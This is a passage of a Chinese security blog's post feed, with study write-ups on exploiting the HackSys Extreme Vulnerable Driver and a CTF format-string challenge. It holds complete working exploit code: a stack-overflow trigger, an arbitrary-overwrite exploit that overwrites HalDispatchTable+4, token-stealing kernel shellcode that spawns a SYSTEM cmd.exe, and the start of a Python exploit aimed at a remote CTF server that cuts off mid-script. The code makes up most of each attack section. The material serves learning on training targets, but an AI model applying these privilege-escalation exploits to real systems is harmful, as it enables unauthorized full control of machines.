FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to get device handle : (0x%X\r\n)"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got the device Handle : 0x%X\r\n"</span>, hDriver);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating Memory For Input Buffer\r\n"</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if (!lpInBuffer) &#123;</span></span><br><span class="line"><span class="comment">    printf("HeapAlloc failed :(0x%X\r\n)",GetLastError());</span></span><br><span class="line"><span class="comment">    return 1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    printf("Input buffer allocated as 0x%X bytes.\r\n",nInBufferSize);</span></span><br><span class="line"><span class="comment">    printf("Input buffer address : 0x%p\r\n",lpInBuffer);</span></span><br><span class="line"><span class="comment">    printf("Filling buffer with A's\r\n");</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t[*]Payload is at : %p\n"</span>, TokenStealingShellcodeWin);</span><br><span class="line">    <span class="comment">//junk's length is 2080</span></span><br><span class="line">    CHAR *chBuffer = (CHAR*)<span class="built_in">malloc</span>(<span class="number">2084</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t[*]Buffer is at : %p\n"</span>, &amp;chBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(chBuffer, <span class="number">0x41</span>, <span class="number">2048</span>);</span><br><span class="line">    <span class="built_in">memset</span>(chBuffer + <span class="number">2048</span>, <span class="number">0x42</span>, <span class="number">32</span>);</span><br><span class="line">    chBuffer[<span class="number">2080</span>] = (DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x000000FF</span>;</span><br><span class="line">    chBuffer[<span class="number">2080</span> + <span class="number">1</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    chBuffer[<span class="number">2080</span> + <span class="number">2</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    chBuffer[<span class="number">2080</span> + <span class="number">3</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Send IOCTL request\r\n"</span>);</span><br><span class="line"></span><br><span class="line">    DeviceIoControl(hDriver,</span><br><span class="line">        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">        chBuffer,</span><br><span class="line">        <span class="number">2084</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;lpBytesReturned,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"IOCTL request completed,cleaning up da heap.\r\n"</span>);</span><br><span class="line">    <span class="comment">//HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);</span></span><br><span class="line">    CloseHandle(hDriver);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新编译后运行exploit程序。<br>因为我这个xp在安装的时候没有装whoami工具，所以在看我使用了ProcessExplorer来看新启动的cmd的权限信息。<br>在运行exploit之前<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/before_exp.png"><br>运行exploit<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/after_exp.png"><br>成功拿到最高权限。</p>
<h4 id="0x05：关于shell-code的分析"><a href="#0x05：关于shell-code的分析" class="headerlink" title="0x05：关于shell code的分析"></a>0x05：关于shell code的分析</h4><p>想要分析shellcode是如何工作的，直接在它最前面加一个<code>int 3</code>然后重新编译，再把exploit跑起来，windbg里分析就好了。<br>前面说到这个获取token要找到EPROCESS结构。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/process.png"></p>
<p>然而windows有个API <code>PsGetCurrentProcess</code>可以获取包含EPROCESS结构的process对象。<br>反汇编看下这个API的实现：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/getprocess.png"></p>
<p>使用<code>dt -b -v _EPROCESS</code>查看<code>EPROCESS</code>结构。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/EPROCESS.png"><br>之前在shellcode中看到的一些数据的定义，都可以在这里找到。<br>下面来分析我们这段shellcode的工作。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/shellcode.png"><br>单步<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/shellcode1.png"><br>至此，获得当前进程的EPROCESS结构指针保存在ecx待用。<br>下面进入循环寻找SYSTEM_PID,然后获取其token：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/shellcode2.png"><br>这个循环跑的次数挺多，我直接下断跳出循环接着分析，这里来到token替换的部分：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/shellcode3.png"><br>之后直接popad弹出之前保存的寄存器的值，然后回到原来的代码去执行，这个时候我们的进程(demo_bof)的token已经是system进程的token了，这个时候直接起一个cmd，就可以得到一个最高权限的shell了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/back.png"><br>这个时候F5，虚拟机那边就已经起来一个system32的cmd了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE1/getit.png"></p>
<h4 id="0x06-参考与引用"><a href="#0x06-参考与引用" class="headerlink" title="0x06: 参考与引用"></a>0x06: 参考与引用</h4><p><a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a><br>lhs0k师傅的帮助</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>windows kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Kernel Exploit Study(2)</title>
    <url>/2017/01/20/Windows-Kernel-Exploit-Study-2/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>第二部分关于<code>任意地址写</code>类型漏洞利用的<code>demo</code>。</p>
<a id="more"></a>


<h4 id="0x01-环境相关"><a href="#0x01-环境相关" class="headerlink" title="0x01: 环境相关"></a>0x01: 环境相关</h4><p>环境和<a href="http://o0xmuhe.me/2017/01/19/Windows-Kernel-Exploit-Study-1/">前一篇文章中的环境配置相同</a>。</p>
<h4 id="0x02：驱动及demo代码"><a href="#0x02：驱动及demo代码" class="headerlink" title="0x02：驱动及demo代码"></a>0x02：驱动及demo代码</h4><p>驱动中的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Trigger the Arbitrary Overwrite Vulnerability</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name="UserWriteWhatWhere"&gt;The pointer to WRITE_WHAT_WHERE structure&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">TriggerArbitraryOverwrite</span><span class="params">(IN PWRITE_WHAT_WHERE UserWriteWhatWhere)</span> </span>&#123;</span><br><span class="line">    PULONG What = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG Where = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        ProbeForRead((PVOID)UserWriteWhatWhere,</span><br><span class="line">                     <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">                     (ULONG)__alignof(WRITE_WHAT_WHERE));</span><br><span class="line"></span><br><span class="line">        What = UserWriteWhatWhere-&gt;What;</span><br><span class="line">        Where = UserWriteWhatWhere-&gt;Where;</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">"[+] UserWriteWhatWhere: 0x%p\n"</span>, UserWriteWhatWhere);</span><br><span class="line">        DbgPrint(<span class="string">"[+] WRITE_WHAT_WHERE Size: 0x%X\n"</span>, <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE));</span><br><span class="line">        DbgPrint(<span class="string">"[+] UserWriteWhatWhere-&gt;What: 0x%p\n"</span>, What);</span><br><span class="line">        DbgPrint(<span class="string">"[+] UserWriteWhatWhere-&gt;Where: 0x%p\n"</span>, Where);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is properly validating if address</span></span><br><span class="line">        <span class="comment">// pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()</span></span><br><span class="line">        <span class="comment">// routine before performing the write operation</span></span><br><span class="line">        ProbeForRead((PVOID)Where, <span class="keyword">sizeof</span>(PULONG), (ULONG)__alignof(PULONG));</span><br><span class="line">        ProbeForRead((PVOID)What, <span class="keyword">sizeof</span>(PULONG), (ULONG)__alignof(PULONG));</span><br><span class="line"></span><br><span class="line">        *(Where) = *(What);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Arbitrary Overwrite\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is writing the value pointed by 'What' to memory location</span></span><br><span class="line">        <span class="comment">// pointed by 'Where' without properly validating if the values pointed by 'Where'</span></span><br><span class="line">        <span class="comment">// and 'What' resides in User mode</span></span><br><span class="line">        *(Where) = *(What);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">"[-] Exception Code: 0x%X\n"</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个代码很简单粗暴，用户空间接收<code>What</code>和<code>Where</code>，然后向<code>Where</code>指定的地址写<code>What</code>内容。<br>根据<code>Windows Kernel Exploit</code>这个文档中给出的思路，覆盖<code>HalDispatchTable + 4</code>位置为tokenstealinshellcode的地址，然后触发这个内存覆盖，就可以利用这个漏洞来提权了。<br>下面是demo的代码，为了编译通过，有些地方做了略微的改动。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,\</span></span><br><span class="line">    METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KTHREAD_OFFSET  0x124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EPROCESS_OFFSET 0x044</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PID_OFFSET        0x084</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLINK_OFFSET    0x088</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOKEN_OFFSET    0x0c8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PID      0x004</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">TokenStealingShellcodeWin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line"></span><br><span class="line">        mov eax, fs:[KTHREAD_OFFSET]</span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]</span><br><span class="line"></span><br><span class="line">        mov ecx, eax</span><br><span class="line">        mov ebx, [eax + TOKEN_OFFSET]</span><br><span class="line">        mov edx, SYSTEM_PID</span><br><span class="line"></span><br><span class="line">        SearchSystemPID :</span><br><span class="line">        mov eax, [eax + FLINK_OFFSET]</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp[eax + PID_OFFSET], edx</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">            mov edx, [eax + TOKEN_OFFSET]</span><br><span class="line">            mov[ecx + TOKEN_OFFSET], edx</span><br><span class="line"></span><br><span class="line">            popad</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span> &#123;</span></span><br><span class="line">    PULONG What;</span><br><span class="line">    PULONG Where;</span><br><span class="line">&#125;WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">    SystemBasicInformation,</span><br><span class="line">    SystemProcessorInformation,</span><br><span class="line">    SystemPerformanceInformation,</span><br><span class="line">    SystemTimeOfDayInformation,</span><br><span class="line">    SystemPathInformation,</span><br><span class="line">    SystemProcessInfomation,</span><br><span class="line">    SystemCallCountInformation,</span><br><span class="line">    SystemDeviceInformation,</span><br><span class="line">    SystemProcessorPerformanceInformation,</span><br><span class="line">    SystemFlagsInformation,</span><br><span class="line">    SystemCallTimeInformation,</span><br><span class="line">    SystemModuleInformation</span><br><span class="line">&#125;SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PVOID Reserved1;</span><br><span class="line">    PVOID Reserved2;</span><br><span class="line">    PVOID Base;</span><br><span class="line">    ULONG ImageSize;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD  Id;</span><br><span class="line">    WORD  Rank;</span><br><span class="line">    WORD  w108;</span><br><span class="line">    WORD  NameOffset;</span><br><span class="line">    CHAR  imageName[<span class="number">256</span>];</span><br><span class="line">&#125;SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ULONG ModulesCount;</span><br><span class="line">    SYSTEM_MODULE Modules[<span class="number">0</span>];</span><br><span class="line">&#125;SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI *NtQuerySystemInformation_t)</span><span class="params">(IN SYSTEM_INFORMATION_CLASS, \</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PVOID SystemInformation, \</span></span></span><br><span class="line"><span class="function"><span class="params">    IN ULONG  SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PULONG ReturnLength)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI *NtQueryIntervalProfile_t)</span><span class="params">(IN ULONG ProfileSource, \</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PULONG Interval)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">    PWRITE_WHAT_WHERE WriteWhatWhere = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID HalDispatchTabel = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID HalDispatchTabel4 = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE ntoskrnl = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID kernelBase = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE ntdll = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//function</span></span><br><span class="line">    NtQuerySystemInformation_t NtQuerySystemInformation;</span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    NTSTATUS Ntstatus = <span class="number">0xc0000001</span>;</span><br><span class="line">    SIZE_T ReturnLength;</span><br><span class="line">    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;</span><br><span class="line">    PCHAR KernelImage;</span><br><span class="line">    PVOID KernelBaseAddressInKernelMode;</span><br><span class="line">    HMODULE hKernelInUserMode = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID EopPayload = &amp;TokenStealingShellcodeWin;</span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    NtQueryIntervalProfile_t NtQueryIntervalProfile;</span><br><span class="line">    ULONG Interval = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line">    DWORD lpBytesReturned;</span><br><span class="line">    PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG IpInBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    LPCSTR lpDeviceName = (LPCSTR) <span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Getting the device handle\r\n"</span>);</span><br><span class="line">    HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to get device handle : (0x%X\r\n)"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got the device Handle : 0x%X\r\n"</span>, hDriver);</span><br><span class="line"></span><br><span class="line">    WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), \</span><br><span class="line">        HEAP_ZERO_MEMORY, \</span><br><span class="line">        <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Step 3.</span></span><br><span class="line">    ntdll = GetModuleHandle(<span class="string">L"ntdll.dll"</span>);</span><br><span class="line">    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, \</span><br><span class="line">        <span class="string">"NtQuerySystemInformation"</span>);</span><br><span class="line"></span><br><span class="line">    Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \</span><br><span class="line">        <span class="literal">NULL</span>, \</span><br><span class="line">        <span class="number">0</span>, \</span><br><span class="line">        &amp;ReturnLength);</span><br><span class="line">    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), \</span><br><span class="line">        HEAP_ZERO_MEMORY, \</span><br><span class="line">        ReturnLength);</span><br><span class="line">    Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \</span><br><span class="line">        pSystemModuleInformation, \</span><br><span class="line">        ReturnLength, \</span><br><span class="line">        &amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">    KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Modules[<span class="number">0</span>].Base;</span><br><span class="line">    KernelImage = <span class="built_in">strrchr</span>((PCHAR)pSystemModuleInformation-&gt;Modules[<span class="number">0</span>].imageName, <span class="string">'\\'</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Step 1 and 2:</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"KernelImage : %s\n"</span>, KernelImage);</span><br><span class="line">    hKernelInUserMode = LoadLibraryA(KernelImage);</span><br><span class="line">    HalDispatchTabel = (PVOID)GetProcAddress(hKernelInUserMode, <span class="string">"HalDispatchTabel"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Step 4:</span></span><br><span class="line">    HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel - (ULONG)hKernelInUserMode);</span><br><span class="line">    HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel + (ULONG)KernelBaseAddressInKernelMode);</span><br><span class="line"></span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)pSystemModuleInformation);</span><br><span class="line">    FreeLibrary(ntdll);</span><br><span class="line">    FreeLibrary(hKernelInUserMode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//end</span></span><br><span class="line">    HalDispatchTabel4 = (PVOID)((ULONG)HalDispatchTabel + <span class="keyword">sizeof</span>(PVOID));</span><br><span class="line">    WriteWhatWhere-&gt;What = (PULONG)&amp;EopPayload;</span><br><span class="line">    WriteWhatWhere-&gt;Where = (PULONG)HalDispatchTabel4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t[*]Where : 0x%p\n"</span>, WriteWhatWhere-&gt;Where);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t[*]What  : 0x%p\n"</span>, WriteWhatWhere-&gt;What);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t[*]Exp   : 0x%p\n"</span>, EopPayload);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Send IOCTL request\r\n"</span>);</span><br><span class="line"></span><br><span class="line">    DeviceIoControl(hDriver,</span><br><span class="line">        HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,</span><br><span class="line">        (LPVOID)WriteWhatWhere,</span><br><span class="line">        <span class="keyword">sizeof</span>(WriteWhatWhere),</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;lpBytesReturned,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//triger the memory overwrite</span></span><br><span class="line">    ntdll = LoadLibraryA(<span class="string">"ntdll.dll"</span>);</span><br><span class="line">    NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, <span class="string">"NtQueryIntervalProfile"</span>);</span><br><span class="line">    NtQueryIntervalProfile(<span class="number">0x1337</span>, &amp;Interval);</span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)WriteWhatWhere);</span><br><span class="line">    system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"IOCTL request completed,cleaning up da heap.\r\n"</span>);</span><br><span class="line">    CloseHandle(hDriver);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/o0xmuhe/PwnableLog/tree/master/study/windown_kernel_exploit">代码在这里</a></p>
<h4 id="0x03-Exploit"><a href="#0x03-Exploit" class="headerlink" title="0x03: Exploit"></a>0x03: Exploit</h4><p>在运行<code>exp.exe</code>之前</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE2/before.png"></p>
<p>运行之后<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/WKE2/after.png"></p>
<h4 id="0x04：参考与引用"><a href="#0x04：参考与引用" class="headerlink" title="0x04：参考与引用"></a>0x04：参考与引用</h4><p><a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>windows kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>cctf pwn350</title>
    <url>/2016/04/30/cctf-pwn350/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>之前打了CCTF，在CCTF的过程中遇到一个比较有意思的思路，记录一下。</p>
<a id="more"></a>

<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p>可以看到，这是一个 fmt 的漏洞，不过很简单，接收的输入都在stack中，可以确定输入在栈中的位置，可以做到 任意地址读写。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/cctf/vuln.png"><br>一般来说，对于这种类型的漏洞，写shellcode到合适的地址然后跳转过去，或者leak 出 system地址，改其他函数的got，都是可以拿一个shell的。<br>本来，我的思路很窄，想的是构造一个循环，去leak我需要的函数，然后改got去拿shell。<br>joker师傅提点了我一下，可以leak任意两个函数地址，然后去 libcdb.com 查一波libc的版本，就可以确定libc版本，从而得到system的偏移。</p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02:"></a>0x02:</h4><p>综上利用思路就是，leak出任意两个函数地址，然后确定system()的偏移，改掉puts@got,构造puts调用的参数为/bin/sh 就可以拿到shell啦。<br>这是我找libc的时候截图<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/cctf/leak.png"></p>
<h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03:exp"></a>0x03:exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#target = './pwn3'</span></span><br><span class="line">target = (<span class="string">'120.27.155.82'</span>,<span class="number">9000</span>)</span><br><span class="line">r_m = COLORED(RAW, <span class="string">"green"</span>)</span><br><span class="line">w_m = COLORED(RAW, <span class="string">"red"</span>)</span><br><span class="line">pwd = <span class="string">"rxraclhm"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_file</span><span class="params">(name,content)</span>:</span></span><br><span class="line">4io.read_until(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">4io.writeline(<span class="string">"put"</span>)</span><br><span class="line">4io.read_until(<span class="string">"upload:"</span>)</span><br><span class="line">4io.writeline(name)</span><br><span class="line">4io.read_until(<span class="string">"content:"</span>)</span><br><span class="line">4io.writeline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(name)</span>:</span></span><br><span class="line">4io.read_until(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">4io.writeline(<span class="string">"get"</span>)</span><br><span class="line">4io.read_until(<span class="string">'get:'</span>)</span><br><span class="line">4io.writeline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file2</span><span class="params">(name)</span>:</span></span><br><span class="line">4io.writeline(<span class="string">"get"</span>)</span><br><span class="line">4io.read_until(<span class="string">'get:'</span>)</span><br><span class="line">4io.writeline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_file2</span><span class="params">(name,content)</span>:</span></span><br><span class="line">4io.writeline(<span class="string">"put"</span>)</span><br><span class="line">4io.read_until(<span class="string">"upload:"</span>)</span><br><span class="line">4io.writeline(name)</span><br><span class="line">4io.read_until(<span class="string">"content:"</span>)</span><br><span class="line">4io.writeline(content)</span><br><span class="line">pl1 = l32(<span class="number">0x0804A014</span>) <span class="comment">#printf@got</span></span><br><span class="line">pl1 += <span class="string">",%7$s,"</span></span><br><span class="line">pl2 = l32(<span class="number">0x0804A024</span>) <span class="comment">#malloc@got</span></span><br><span class="line">pl2 += <span class="string">",%7$s,"</span></span><br><span class="line">pl3 = l32(<span class="number">0x0804A028</span>) <span class="comment">#puts@got</span></span><br><span class="line">pl3 += <span 